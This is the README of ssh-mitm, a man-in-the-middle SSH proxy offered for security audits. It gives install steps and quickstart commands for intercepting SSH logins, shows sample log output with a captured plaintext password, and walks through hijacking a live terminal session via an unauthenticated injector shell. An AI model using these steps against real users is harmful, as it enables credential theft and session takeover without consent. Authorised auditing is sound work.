# ssh-mitm - intercept ssh traffic

[![CodeFactor](https://www.codefactor.io/repository/github/ssh-mitm/ssh-mitm/badge)](https://www.codefactor.io/repository/github/ssh-mitm/ssh-mitm)
[![Github version](https://img.shields.io/github/v/release/ssh-mitm/ssh-mitm?label=github&logo=github)](https://github.com/ssh-mitm/ssh-mitm/releases)
[![PyPI version](https://img.shields.io/pypi/v/ssh-mitm.svg?logo=pypi&logoColor=FFE873)](https://pypi.org/project/ssh-mitm/)
[![Supported Python versions](https://img.shields.io/pypi/pyversions/ssh-mitm.svg?logo=python&logoColor=FFE873)](https://pypi.org/project/ssh-mitm/)
[![PyPI downloads](https://pepy.tech/badge/ssh-mitm/month)](https://pepy.tech/project/ssh-mitm)
[![GitHub](https://img.shields.io/github/license/ssh-mitm/ssh-mitm.svg)](https://github.com/ssh-mitm/ssh-mitm/blob/master/LICENSE)

**man in the middle (mitm) server for security audits supporting public key authentication, session hijacking and file manipulation**

![SSH-MITM example](https://ssh-mitm.at/img/mitm-example.png)

## Installation of SSH-MITM


This part of the documentation covers the installation of SSH-MITM.
The first step to using any software package is getting it properly installed.

### $ python -m pip install ssh-mitm


To install SSH-MITM, simply run this simple command in your terminal of choice:

    $ python -m pip install ssh-mitm


### Get the Source Code


SSH-MITM is actively developed on GitHub, where the code is always available.

You can either clone the public repository:

    $ git clone git://github.com/ssh-mitm/ssh-mitm.git

Or, download the tarball:

    $ curl -L https://github.com/ssh-mitm/ssh-mitm/archive/master.tar.gz | tar xz


Once you have a copy of the source, you can embed it in your own Python package, or install it into your site-packages easily:

    $ cd ssh-mitm-master
    $ python -m pip install .

## Quickstart


Eager to get started? This page gives a good introduction in how to get started with SSH-MITM.

First, make sure that:

* SSH-MITM is :ref:`installed <Installation of SSH-MITM>`
* SSH-MITM is up-to-date

Let’s get started with some simple examples.


### Start the ssh-mitm proxy server


Starting an intercepting mitm-ssh server with password authentication is very simple.

All you have to do is run this command in your terminal of choice.

    $ ssh-mitm --remote-host 192.168.0.x

Now let's try to connect to the ssh-mitm server.
The ssh-mitm server is listening on port 10022.

    $ ssh -p 10022 user@proxyserver

You will see the credentials in the log output.

    2021-01-01 11:38:26,098 [INFO]  Client connection established with parameters:
        Remote Address: 192.168.0.x
        Port: 22
        Username: user
        Password: supersecret
        Key: None
        Agent: None


### Hijack a SSH terminal session


Getting the plain text credentials is only half the fun.
SSH-MITM proxy server is able to hijack a ssh session and allows you to interact with it.

Let's get startet with hijacking the session.

    $ ssh-mitm --remote-host 192.168.0.x --ssh-interface ssh_proxy_server.plugins.ssh.mirrorshell.SSHMirrorForwarder

Connect your ssh client with the ssh-mitm proxy.

    $ ssh -p 10022 user@proxyserver

When a client connects, the ssh-mitm proxy server starts a new server, where you can connect with another ssh client.
This server is used to hijack the session.

    2021-01-01 11:42:43,699 [INFO]  created injector shell on port 34463. connect with: ssh -p 34463 127.0.0.1

To hijack the session, you can use your favorite ssh client. This connection does not require authentication.

    $ ssh -p 34463 127.0.0.1

After you are connected, your session will only be updated with new responses, but you are able to execute commands.

Try to execute somme commands in the hijacked session or in the original session.

The output will be shown in both sessions.


## Authors

- Manfred Kaiser
- Simon Böhm
